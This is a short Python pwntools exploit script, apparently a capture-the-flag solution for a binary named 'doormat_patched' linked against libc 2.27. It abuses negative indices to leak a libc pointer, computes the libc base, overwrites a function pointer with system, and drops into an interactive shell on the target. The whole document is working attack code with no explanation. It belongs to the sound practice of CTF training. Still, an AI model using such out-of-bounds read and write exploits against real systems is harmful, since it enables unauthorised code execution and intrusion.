#!/usr/bin/env python3

from pwn import *

exe = ELF("./doormat_patched")
libc = ELF("./libc-2.27.so")

context.binary = exe
context.bits = 64

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.GDB:
            gdb.attach(p)
            pause()
    else:
        p = remote("localhost", 8001)

    return p


def main():
    p = conn()

    # good luck pwning :)
    p.sendline(b"1")
    p.sendline(b"-20")
    p.recvuntil(b"Letter: ")
    leak = u64(p.recvline().strip().ljust(8, b"\x00")) # stderr
    print(hex(leak))

    # calculate libc_base
    libc_base = leak - 0x21ba0
    libc.address = libc_base
    print(hex(libc_base))

    # write to exit
    p.sendline(b"2")
    p.sendline(b"-6")
    payload = flat(
        libc.sym.system
    )
    p.sendline(payload)

    p.interactive()


if __name__ == "__main__":
    main()
